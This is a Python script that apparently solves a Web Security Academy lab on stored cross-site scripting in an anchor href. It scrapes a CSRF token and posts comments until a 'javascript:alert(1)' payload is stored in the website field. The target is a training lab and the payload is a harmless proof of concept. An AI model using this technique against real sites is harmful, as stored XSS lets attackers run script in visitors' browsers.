# LAB: Stored XSS into anchor href attribute with double quotes HTML-encoded
import requests

base = "https://0ae200ca04a0818881422be800b90071.web-security-academy.net"
POST_ID = "4"

s = requests.Session()

print("===========[step1] GET post page & extract CSRF token===============")
r = s.get(f"{base}/post", params={"postId": POST_ID})
print(r.status_code)
# The CSRF token changes per session/request, so never hardcode it; pull it fresh from the page.
if 'name="csrf"' in r.text:
    csrf = r.text.split('name="csrf" value="')[1].split('"')[0]
else:
    print("[-] CSRF Token not Found??")

print("csrf:", csrf)

print("===========[step2] submit a test comment===============")
# The 'website' field ends up as the href value of the comment author's name link (this is the sink).
payload_website = "5"   # TODO: slot for the XSS payload (plain value for now)
data = {
    "csrf": csrf,
    "postId": POST_ID,
    "comment": "1",
    "name": "22",
    "email": "333@4444.com",
    "website": payload_website,
}
r = s.post(f"{base}/post/comment", data=data, allow_redirects=False)
print(r.status_code, r.headers.get("Location"))
'''
302 Found + Location: /post/comment/confirmation?postId=4 means the comment was stored.
'''
print("===========[step3] submit xss comment===============")
# A URL scheme the browser runs as code on click; double-quote encoding can't block a value inside the href.
payload_website = "javascript:alert(1)"   # the actual payload
data = {
    "csrf": csrf,
    "postId": POST_ID,
    "comment": "1",
    "name": "22",
    "email": "333@4444.com",
    "website": payload_website,
}
r = s.post(f"{base}/post/comment", data=data, allow_redirects=False)
print(r.status_code, r.headers.get("Location"))